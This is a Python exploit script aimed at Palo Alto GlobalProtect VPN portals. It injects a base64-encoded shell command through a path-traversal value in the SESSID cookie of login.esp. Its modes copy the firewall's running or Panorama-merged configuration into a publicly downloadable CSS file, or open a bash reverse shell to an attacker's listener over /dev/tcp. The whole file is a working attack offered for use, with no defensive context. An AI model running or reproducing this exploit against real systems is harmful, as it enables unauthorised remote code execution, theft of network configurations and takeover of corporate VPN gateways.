#!/usr/bin/env python3

import requests
import argparse
import base64
import logging
import logging.handlers
import sys

# Avoid printing insecure ssl requests warnings
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
#

if __name__ == '__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-t',required=True,help='Remote Globalprotect host (e.g. vpn.mycorp.com)')
    parser.add_argument('-d',required=False,action='store_true',help='Enable debug mode')
    parser.add_argument('-a',required=False,choices=['getconf','getpanoramaconf','remoteshell'],default='getconf', 
                        help=('Attack type:\n'
                              ' getconf:         retrieve saved config\n'
                              ' getpanoramaconf: retrieve panorama merged config\n'
                              ' remoteshell:     triggers connect back shell (requires listener)'))
    parser.add_argument('-r',required=False,help='Remote connectback listener to connect to in ip:port format (e.g. 192.168.10.1:80)')

    args = parser.parse_args()

    my_log = logging.getLogger('MyLog')
    if args.d == True:
        my_log.setLevel(logging.DEBUG)
    else:
        my_log.setLevel(logging.INFO)
    
    lochandler = logging.StreamHandler(stream=sys.stdout)
    my_log.addHandler(lochandler)

    req_uri = f"https://{args.t}/global-protect/login.esp"
    my_log.debug('Request URI: {}'.format(req_uri))

    if args.a == "getconf":
        command = f"cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/portal/css/cert.min.css"
    elif args.a == "getpanoramaconf":
        command = f"cp /opt/pancfg/mgmt/saved-configs/.merged-running-config.xml /var/appweb/sslvpndocs/global-protect/portal/css/cert.min.css"
    else:
        if not args.r:
            my_log.error("You need to specify the connect back host and ip with option -r")
            exit(1)
        r = args.r.split(':')
        command = f"/bin/bash -i >& /dev/tcp/{r[0]}/{r[1]} 0>&1"

    my_log.debug('Remote command: {}'.format(command))

    encoded_command = base64.b64encode(command.encode('ascii')).decode()
    my_log.debug('Encoded command: {}'.format(encoded_command))

    session_cookie = f'/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere229`echo${{IFS}}{encoded_command}|base64${{IFS}}-d|bash`'
    my_log.debug('Session Cookie: {}'.format(session_cookie))

    cookies = {'SESSID': session_cookie}
    
    try:
        r = requests.get(req_uri,cookies=cookies,verify=False,timeout=30)
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)

    if r.status_code == 200:
        my_log.info("Request sent correctly, please wait for the remote cronjob to trigger.")
        if args.a != "remoteshell":
            my_log.info("You can then download the config from {}/global-protect/portal/css/cert.min.css".format(req_uri))
    else:
        my_log.error("Something went wrong with the request :(")
